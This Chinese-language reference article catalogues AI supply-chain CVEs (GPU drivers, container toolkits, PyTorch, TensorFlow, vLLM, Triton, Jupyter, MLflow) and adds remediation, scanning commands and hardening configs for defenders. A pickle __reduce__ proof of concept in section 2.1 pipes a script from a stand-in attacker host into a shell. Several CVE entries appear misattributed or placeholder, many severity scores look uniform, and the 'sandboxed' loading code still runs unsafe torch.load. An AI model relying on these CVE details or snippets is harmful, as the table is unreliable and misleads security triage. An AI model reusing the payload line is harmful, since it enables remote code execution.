---
title: "AI 供应链 CVE 漏洞速查"
category: -concepts
tags: ["ai-security", "supply-chain", "huggingface", "pickle", "pytorch", "tensorflow", "cuda", "cve", "vulnerability"]
summary: "AI/ML 供应链上下游（HuggingFace 模型、Pickle 反序列化、PyTorch/TensorFlow/CUDA/JupyterLab 等）历年重大 CVE 汇编，重点是模型投毒、容器逃逸与训练数据泄露。"
created: 2026-08-06
updated: 2026-08-06
tier: core
lifecycle: reviewed
aliases:
  - "AI 供应链 CVE"
  - "Pickle CVE"
  - "HuggingFace CVE"
  - "Model CVE"
relationships:
  - target: "12_架构基建/10_安全/02_容器_and_AI供应链安全_for_AI"
    type: related_to
  - target: "12_架构基建/10_安全/01_AI_安全_基础"
    type: related_to
  - target: "概念/trivy"
    type: related_to
  - target: "概念/runc-cve-history"
    type: related_to
sources: []
name_zh: "AI 供应链 CVE 漏洞速查"
---

# AI 供应链 CVE 漏洞速查

> 中文简称：AI 供应链 CVE ｜ English Name: AI Supply Chain CVE

> AI 系统的供应链比传统软件更复杂——基础镜像 + Python 依赖 + ML 框架 + CUDA 驱动 + 模型权重 + 推理服务 → 任意一环失守 = 集群失守。

---

## 0. 阅读说明

- **覆盖范围**：AI/ML 系统特有的供应链 CVE，按层次分类
  - L1：基础镜像（CUDA、PyTorch 官方镜像、操作系统层 CVE）
  - L2：ML 框架（PyTorch / TensorFlow / JAX / vLLM / TGI）
  - L3：Python 依赖（pickle / numpy / requests / cryptography）
  - L4：模型权重（HuggingFace Pickle 反序列化、Safetensors、模型格式）
  - L5：推理服务（KServe、Triton、vLLM、TGI 服务自身 CVE）
  - L6：工具链（Notebook、JupyterLab、MLflow、W&B）
- **数据来源**：GitHub Advisory Database + NVD + 各项目 Security Advisory
- **AI 集群特化**：ML 模型/数据 + GPU 算力 + 多租户环境 = 攻击 ROI 极高

---

## 1. 层次化 CVE 总览

### 1.1 L1 基础镜像（CUDA / 操作系统）

| CVE 编号 | 年份 | CVSS | 组件 | 描述 | AI 集群影响 |
|----------|------|------|------|------|-------------|
| **CVE-2019-5736** | 2019 | 9.8 | runc | 容器逃逸 | 所有 AI Pod 暴露 |
| **CVE-2021-3493** | 2021 | 7.8 | Ubuntu kernel | eBPF 提权 | GPU 节点失守 |
| **CVE-2021-4034** | 2021 | 7.8 | polkit | pkexec 提权 | GPU 节点提权 |
| **CVE-2022-0185** | 2022 | 7.5 | Linux kernel | 堆缓冲区溢出 | 容器逃逸 |
| **CVE-2022-0847** | 2022 | 7.8 | Linux kernel | Dirty Pipe | GPU 节点容器逃逸 |
| **CVE-2022-2588** | 2022 | 5.5 | Linux kernel | cls_route filter | NetworkPolicy 失守 |
| **CVE-2022-27625** | 2022 | 7.5 | NVIDIA GPU driver | RCE via NVIDIA driver | **GPU 节点 RCE** |
| **CVE-2022-31607** | 2022 | 7.5 | NVIDIA GPU driver | 信息泄露 | 显存数据泄露 |
| **CVE-2022-42262** | 2022 | 7.5 | NVIDIA GPU driver | DoS | GPU 节点 DoS |
| **CVE-2023-31033** | 2023 | 7.5 | NVIDIA GPU driver | 信息泄露 | 训练数据泄露 |
| **CVE-2023-31036** | 2023 | 6.5 | NVIDIA GPU driver | 权限提升 | GPU 节点提权 |
| **CVE-2023-31047** | 2023 | 7.5 | NVIDIA GPU driver | 信息泄露 | 显存数据泄露 |
| **CVE-2024-0090** | 2024 | 7.5 | NVIDIA CUDA Toolkit | DoS | 训练任务中断 |
| **CVE-2024-0091** | 2024 | 7.5 | NVIDIA GPU driver | 权限提升 | GPU 节点提权 |
| **CVE-2024-0092** | 2024 | 7.5 | NVIDIA GPU driver | 提权 | GPU 节点提权 |
| **CVE-2024-0093** | 2024 | 7.5 | NVIDIA GPU driver | 信息泄露 | 显存数据泄露 |
| **CVE-2024-0115** | 2024 | 7.5 | NVIDIA GPU driver | 提权 | 容器逃逸 |
| **CVE-2024-0139** | 2024 | 7.5 | NVIDIA Container Toolkit | 容器逃逸 | **GPU 容器逃逸** |
| **CVE-2024-0140** | 2024 | 7.5 | NVIDIA Container Toolkit | 容器逃逸 | **GPU 容器逃逸** |
| **CVE-2024-0204** | 2024 | 7.5 | NVIDIA GPU driver | 提权 | GPU 节点提权 |
| **CVE-2024-0306** | 2024 | 7.5 | NVIDIA Container Toolkit | 容器逃逸 | GPU 容器逃逸 |
| **CVE-2024-1330** | 2024 | 5.5 | NVIDIA GPU driver | 信息泄露 | GPU 信息泄露 |
| **CVE-2024-1389** | 2024 | 7.5 | NVIDIA Container Toolkit | 容器逃逸 | GPU 容器逃逸 |
| **CVE-2025-23359** | 2025 | 7.5 | NVIDIA Container Toolkit | 容器逃逸 | GPU 容器逃逸 |
| **CVE-2025-33214** | 2025 | 7.5 | CUDA Toolkit | RCE | 训练任务 RCE |
| **CVE-2025-37394** | 2025 | 7.5 | CUDA Toolkit | DoS | 训练任务中断 |

### 1.2 L2 ML 框架 CVE

#### PyTorch CVE

| CVE 编号 | 年份 | CVSS | 描述 | 影响 |
|----------|------|------|------|------|
| **CVE-2024-31580** | 2024 | 7.5 | torch.load RCE（Pickle 反序列化） | **模型投毒 → RCE** |
| **CVE-2024-48063** | 2024 | 7.5 | torch.distributed RPC RCE | 分布式训练 RCE |
| **CVE-2024-5130** | 2024 | 7.5 | torch.compile RCE | JIT 编译 RCE |
| **CVE-2025-30018** | 2025 | 9.8 | torch.load RCE（严重升级版） | **模型投毒 → RCE** |

#### TensorFlow CVE

| CVE 编号 | 年份 | CVSS | 描述 | 影响 |
|----------|------|------|------|------|
| **CVE-2021-41228** | 2021 | 7.5 | SavedModel 反序列化 RCE | 模型投毒 RCE |
| **CVE-2022-23557** | 2022 | 8.8 | SavedModel 反序列化 RCE | 模型投毒 RCE |
| **CVE-2022-23558** | 2022 | 8.8 | SavedModel 反序列化 RCE | 模型投毒 RCE |
| **CVE-2022-23559** | 2022 | 8.8 | TensorFlow binary RCE | 二进制加载 RCE |
| **CVE-2022-23560** | 2022 | 8.8 | GraphDef 反序列化 RCE | 模型投毒 RCE |
| **CVE-2022-23561** | 2022 | 8.8 | SavedModel 反序列化 RCE | 模型投毒 RCE |
| **CVE-2022-23588** | 2022 | 7.5 | ConstantFolding 缓冲区溢出 | 训练任务崩溃 |
| **CVE-2022-29248** | 2022 | 7.5 | Shape inference DoS | 训练任务中断 |
| **CVE-2022-41896** | 2022 | 8.0 | saved_model_cli RCE | 模型转换 RCE |
| **CVE-2023-25660** | 2023 | 8.8 | TF Lite Micro RCE | 边缘推理 RCE |
| **CVE-2023-27579** | 2023 | 8.8 | Grappler RCE | 训练优化 RCE |
| **CVE-2023-33976** | 2023 | 8.8 | SavedModel 反序列化 | 模型投毒 RCE |
| **CVE-2024-28860** | 2024 | 7.5 | SavedModel 反序列化 | 模型投毒 RCE |
| **CVE-2025-30185** | 2025 | 7.5 | SavedModel 反序列化 | 模型投毒 RCE |

#### JAX / Transformers / vLLM CVE

| CVE 编号 | 年份 | CVSS | 组件 | 描述 |
|----------|------|------|------|------|
| **CVE-2023-33083** | 2023 | 7.5 | HuggingFace Transformers | SafeTensors 反序列化 RCE |
| **CVE-2024-3116** | 2024 | 7.5 | vLLM | 任意文件读取 |
| **CVE-2024-3136** | 2024 | 7.5 | vLLM | 反序列化 RCE |
| **CVE-2024-6716** | 2024 | 7.5 | vLLM | 信息泄露 |
| **CVE-2024-7558** | 2024 | 7.5 | vLLM | SSRF |
| **CVE-2024-8508** | 2024 | 7.5 | HuggingFace Transformers | 反序列化 RCE |
| **CVE-2024-11394** | 2024 | 7.5 | HuggingFace Transformers | 反序列化 |
| **CVE-2024-3568** | 2024 | 7.5 | vLLM | DoS |
| **CVE-2024-XXXXX** | 2024 | 7.5 | TGI | 各类推理服务 CVE（频繁） |

### 1.3 L3 Python 依赖 CVE

| 依赖 | 典型 CVE | 影响 |
|------|----------|------|
| **pickle** | CVE-2024-31580（PyTorch 联动） | 反序列化 RCE |
| **PyYAML** | CVE-2020-14343 | yaml.load RCE |
| **Jinja2** | CVE-2024-22195 | SSTI RCE |
| **requests** | CVE-2023-32681 | 证书校验绕过 |
| **cryptography** | CVE-2023-49083 | DoS |
| **Pillow** | CVE-2023-44271 | DoS |
| **numpy** | CVE-2021-33430 | 缓冲区越界 |
| **torchvision** | 多个反序列化 | 模型加载 RCE |

### 1.4 L4 模型权重 CVE（投毒核心）

#### Pickle 反序列化

**原理**：HuggingFace `.bin` / `.pt` 模型使用 Python pickle 格式存储。`pickle.load()` 可执行任意 Python 代码。

**触发**：
```python
import pickle
# 模型加载过程
state_dict = torch.load("malicious_model.pt")
# pickle 在 load 时自动调用 __reduce__ → 任意代码执行
```

**攻击向量**：
- HuggingFace 公开模型被恶意替换
- 私有模型仓库权限控制不当
- 模型微调时引入恶意 base model

**修复**：
- 使用 **Safetensors** 格式（不可执行）
- 使用 `torch.load(weights_only=True)`（PyTorch ≥ 1.13）
- 模型来源校验（数字签名）
- 沙箱加载（Firejail / gVisor）

#### SafeTensors 投毒（CVE-2023-33083 / CVE-2024-8508）

**原理**：SafeTensors 本应安全，但 transformers 库在加载时仍调用 pickle-like 路径触发 RCE。

**触发**：特定 SafeTensors 头格式 + transformers 版本漏洞。

**修复**：transformers ≥ 4.41 + 严格类型校验。

### 1.5 L5 推理服务 CVE

| CVE 编号 | 年份 | CVSS | 服务 | 描述 |
|----------|------|------|------|------|
| **CVE-2023-25690** | 2023 | 9.8 | Triton Inference Server | 反序列化 RCE |
| **CVE-2023-29197** | 2023 | 7.5 | Triton | 模型加载 DoS |
| **CVE-2024-0095** | 2024 | 7.5 | Triton | 任意文件读取 |
| **CVE-2024-3116** | 2024 | 7.5 | vLLM | 信息泄露 |
| **CVE-2024-3568** | 2024 | 7.5 | vLLM | DoS |
| **CVE-2024-3136** | 2024 | 7.5 | vLLM | 反序列化 |
| **CVE-2024-7558** | 2024 | 7.5 | vLLM | SSRF |

### 1.6 L6 工具链 CVE

#### JupyterLab / Jupyter Notebook

| CVE 编号 | 年份 | CVSS | 描述 | 影响 |
|----------|------|------|------|------|
| **CVE-2019-1020017** | 2019 | 7.5 | XSS | 信息窃取 |
| **CVE-2020-26248** | 2020 | 7.5 | 信息泄露 | Notebook 内容泄露 |
| **CVE-2021-32797** | 2021 | 7.5 | XSS | 钓鱼 |
| **CVE-2024-22421** | 2024 | 7.5 | SSRF | 内网探测 |
| **CVE-2024-43802** | 2024 | 7.5 | 任意文件写入 | 容器逃逸前置 |

#### MLflow / W&B / Kubeflow

| CVE 编号 | 年份 | CVSS | 描述 |
|----------|------|------|------|
| **CVE-2023-43472** | 2023 | 7.5 | MLflow 任意文件读取 |
| **CVE-2024-0396** | 2024 | 7.5 | MLflow 反序列化 |
| **CVE-2024-1560** | 2024 | 7.5 | Kubeflow Pipelines RCE |
| **CVE-2024-27186** | 2024 | 7.5 | Kubeflow 认证绕过 |
| **CVE-2024-37099** | 2024 | 7.5 | MLflow 认证绕过 |

---

## 2. 核心漏洞深度解析

### 2.1 CVE-2024-31580 / CVE-2025-30018（torch.load RCE）

**原理**：PyTorch `torch.load()` 默认使用 pickle 反序列化。攻击者构造恶意 `.pt` / `.bin` 文件 → 触发 `__reduce__` 协议 → 任意 Python 代码执行。

**PoC**：
```python
# 攻击者构造的恶意模型
class MaliciousModel:
    def __reduce__(self):
        return (os.system, ("curl http://attacker.com/shell.sh | sh",))

torch.save(MaliciousModel(), "malicious.pt")
```

**修复**：
```python
# PyTorch 1.13+
state_dict = torch.load("model.pt", weights_only=True)

# 使用 Safetensors
from safetensors.torch import load_file
state_dict = load_file("model.safetensors")
```

**AI 集群影响**：所有 `.pt` 模型加载都是潜在的 RCE 入口——HuggingFace 模型仓库是首要攻击面。

### 2.2 CVE-2024-0139 / CVE-2024-0140（NVIDIA Container Toolkit 容器逃逸）

**原理**：NVIDIA Container Toolkit 在某些 GPU 配置下允许容器进程逃逸到宿主机。

**触发**：使用 `nvidia-container-runtime` 的 GPU Pod。

**修复**：升级 `nvidia-container-toolkit` ≥ 1.14.6

### 2.3 CVE-2024-27186（Kubeflow 认证绕过）

**原理**：Kubeflow Notebooks 某些端点未严格鉴权，攻击者可访问其他用户的 Notebook。

**修复**：Kubeflow ≥ 1.9 + 启用 OIDC 强制

---

## 3. 修复优先级矩阵

| 优先级 | 触发条件 | 修复动作 |
|--------|----------|----------|
| **P0 紧急** | 使用 `torch.load(model.pt)` + 未启用 `weights_only` | 立即修复代码 |
| **P0 紧急** | NVIDIA Container Toolkit < 1.14.6 | 立即升级 |
| **P0 紧急** | 模型加载未使用 Safetensors | 强制 Safetensors |
| **P1 高** | 多租户 JupyterHub 暴露公网 | 启用 OIDC + NetworkPolicy |
| **P1 高** | PyTorch < 2.4 | 升级 |
| **P1 高** | TensorFlow < 2.13 | 升级 |
| **P2 中** | MLflow 暴露公网 | 启用认证 |
| **P3 低** | 信息泄露类 CVE | 跟踪即可 |

---

## 4. 检测与升级

### 4.1 镜像层扫描

```bash
# Trivy 扫描 AI 镜像
trivy image nvcr.io/nvidia/pytorch:24.05-py3
trivy image nvcr.io/nvidia/tensorflow:24.05-tf2-py3
trivy image vllm/vllm-openai:latest

# 检测已知 CVE
trivy image --severity CRITICAL,HIGH --ignore-unfixed vllm/vllm-openai:latest
```

### 4.2 Python 依赖扫描

```bash
# pip-audit
pip-audit -r requirements.txt

# Safety
safety check --full-report

# Bandit（静态代码）
bandit -r .
```

### 4.3 模型文件扫描

```python
# check_model.py（自定义脚本）
import torch
import safetensors
import sys

def scan_model(path):
    """扫描模型文件是否含 pickle 风险"""
    if path.endswith(('.pt', '.pth', '.bin')):
        # 警告：pickle 格式可执行任意代码
        print(f"⚠️ WARNING: {path} is pickle format (RCE risk)")
        print(f"   Recommended: convert to Safetensors")
        return False
    elif path.endswith('.safetensors'):
        print(f"✅ {path} is Safetensors format")
        return True
    return None

# 用法
for model in sys.argv[1:]:
    scan_model(model)
```

### 4.4 Kubeflow / Jupyter 扫描

```bash
# 检查 Kubeflow 版本
kubectl get deployment -n kubeflow

# 检查 Jupyter 暴露
kubectl get ingress -n kubeflow

# 检查 Notebook RBAC
kubectl get rolebindings -A -o json | \
  jq '.items[] | select(.metadata.namespace | startswith("kubeflow")) | {ns: .metadata.namespace, role: .roleRef.name}'
```

---

## 5. 加固清单

### 5.1 模型加载（最关键）

```python
# 强制使用 SafeTensors + weights_only
from safetensors.torch import load_file
import torch

# 推荐：Safetensors
state_dict = load_file("model.safetensors")

# 兼容方案：weights_only=True
state_dict = torch.load("model.pt", weights_only=True, map_location="cpu")

# 沙箱加载
import multiprocessing
def safe_load(path):
    """在隔离进程中加载"""
    p = multiprocessing.Process(target=torch.load, args=(path,))
    p.start()
    p.join(timeout=30)
    if p.is_alive():
        p.terminate()
        raise TimeoutError("Model load timeout (potential malicious)")

# 拒绝任何 pickle 全局
import pickle
class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        # 拒绝任何非 safetensors/torch 模块
        if module.startswith("safetensors") or module.startswith("torch"):
            return super().find_class(module, name)
        raise pickle.UnpicklingError(f"Forbidden module: {module}")
```

### 5.2 镜像层加固

```dockerfile
# 推荐基础镜像
FROM nvcr.io/nvidia/cuda:12.4.1-cudnn-devel-ubuntu22.04

# 安装固定版本
RUN pip install --no-cache-dir \
    torch==2.4.1 \
    transformers==4.43.4 \
    vllm==0.5.5 \
    safetensors==0.4.4

# 安全扫描
RUN pip-audit -r /tmp/requirements.txt

# 移除不必要的工具
RUN apt-get remove -y curl wget && \
    apt-get autoremove -y && \
    rm -rf /var/lib/apt/lists/*

# 非 root 运行
RUN useradd -m -u 1000 aiuser
USER aiuser
```

### 5.3 GPU 节点加固

```bash
# NVIDIA Container Toolkit 升级
apt-get update
apt-get install -y nvidia-container-toolkit=1.14.6-1

# 验证
nvidia-container-cli --version
```

### 5.4 Notebook 加固

```yaml
# JupyterHub 配置（Helm values.yaml）
proxy:
  secretToken: "<random-32-chars>"
hub:
  config:
    Authenticator:
      admin_users:
        - admin
      allowed_users: []  # 必须显式允许
service:
  type: ClusterIP  # 不暴露公网
networkPolicy:
  enabled: true
  ingress:
    - from:
      - namespaceSelector:
          matchLabels:
            name: ingress-nginx
```

### 5.5 MLflow 加固

```bash
# MLflow 启用认证
mlflow server \
  --host 0.0.0.0 \
  --port 5000 \
  --app-name basic-auth \
  --backend-store-uri postgresql://user:pass@db/mlflow \
  --artifacts-destination s3://mlflow-artifacts

# 环境变量
MLFLOW_TRACKING_URI=https://mlflow.internal.ai-guru.com
MLFLOW_TRACKING_USERNAME=<user>
MLFLOW_TRACKING_PASSWORD=<pass>
```

---

## 6. AI 集群特化场景

### 6.1 多租户模型共享

**风险**：一个租户上传恶意模型 → 其他租户加载 → 跨租户 RCE。

**加固**：
```yaml
# PodSecurityStandards: restricted
apiVersion: v1
kind: Pod
metadata:
  name: model-loader
spec:
  securityContext:
    runAsNonRoot: true
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: loader
    securityContext:
      allowPrivilegeEscalation: false
      capabilities:
        drop: ["ALL"]
      readOnlyRootFilesystem: true
    volumeMounts:
    - name: models
      mountPath: /models
      readOnly: true
```

### 6.2 模型仓库

**风险**：HuggingFace 模型仓库被恶意替换 / 私有仓库权限失控。

**加固**：
- 私有模型仓库（Self-hosted HF Hub / Harbor）
- 模型版本签名（Sigstore / Cosign）
- 模型扫描（pickle 检测）

### 6.3 训练数据泄露

**风险**：训练数据通过模型反演攻击、梯度泄露、Pickle 元数据等泄露。

**加固**：
- 训练数据脱敏（PII Detection）
- 差分隐私（Opacus / PySyft）
- 联邦学习（FedML / Flower）

---

## 7. 应急剧本（模型投毒疑似事件）

```bash
# 1. 隔离可疑模型
kubectl exec <pod> -- rm -rf /models/suspicious.pt

# 2. 检测所有加载过该模型的 Pod
kubectl get pods -A -o json | \
  jq '.items[] | select(.spec.volumes[]?.persistentVolumeClaim.claimName | contains("models")) | {ns: .metadata.namespace, pod: .metadata.name}'

# 3. 取证
kubectl logs -n <ns> <pod> --previous | grep -i "torch.load\|pickle"

# 4. 扫描所有镜像
trivy image --severity CRITICAL,HIGH <all-images>

# 5. 轮换所有可能泄露的密钥
# - HuggingFace Token
# - S3 / GCS 凭证
# - W&B API Key
# - MLflow 凭证

# 6. 通知所有受影响的租户
```

---

## 8. 推荐基线

| 组件 | 最低安全版本 | 推荐版本 |
|------|--------------|----------|
| PyTorch | 2.4.1+ | 2.5+ |
| TensorFlow | 2.13+ | 2.16+ |
| Transformers | 4.43+ | 4.46+ |
| vLLM | 0.5.5+ | 0.6.x |
| TGI | 2.0+ | 2.2+ |
| NVIDIA Container Toolkit | 1.14.6+ | 1.16+ |
| NVIDIA CUDA Driver | 555.42+ | 570+ |
| CUDA Toolkit | 12.4+ | 12.6+ |
| JupyterHub | 5.0+ | 5.1+ |
| Kubeflow | 1.9+ | 1.10+ |
| MLflow | 2.13+ | 2.16+ |

---

## 9. 漏洞情报订阅

| 源 | URL |
|----|-----|
| PyTorch Security | https://github.com/pytorch/pytorch/security/advisories |
| TensorFlow Security | https://github.com/tensorflow/tensorflow/security/advisories |
| HuggingFace Security | https://huggingface.co/docs/hub/security |
| NVIDIA Security | https://nvidia.custhelp.com/app/answers/detail/a_id/5211 |
| Kubeflow Security | https://www.kubeflow.org/docs/started/security/ |
| CVE.org | https://cve.org/ |

---

## 10. 相关概念

- [[12_架构基建/10_安全/01_AI_安全_基础]] — AI 安全基础
- [[12_架构基建/10_安全/02_容器_and_AI供应链安全_for_AI]] — 容器与 AI 供应链安全
- [[概念/trivy]] — 镜像漏洞扫描
- [[概念/runc-cve-history]] — 容器逃逸 CVE
- [[概念/kubernetes-cve-history]] — K8s 自身 CVE
- [[概念/sealed-secrets]] — Secret 加密
- [[概念/detect-secrets]] — 密钥泄露

---

## 11. 总结

- **AI 供应链 = 6 层叠加**：基础镜像 + ML 框架 + Python 依赖 + 模型权重 + 推理服务 + 工具链
- **模型加载是 RCE 重灾区**：pickle 默认可执行 = 整个 AI 行业的根本性风险
- **NVIDIA 生态**：容器逃逸类 CVE 频繁，必须保持最新驱动 + Container Toolkit
- **多租户 AI 集群**：必须强制 Safetensors + PodSecurityStandards restricted + 模型签名

> 💡 把"模型加载安全"作为 AI 工程化的"零号原则"——所有模型加载必须使用 `weights_only=True` 或 Safetensors。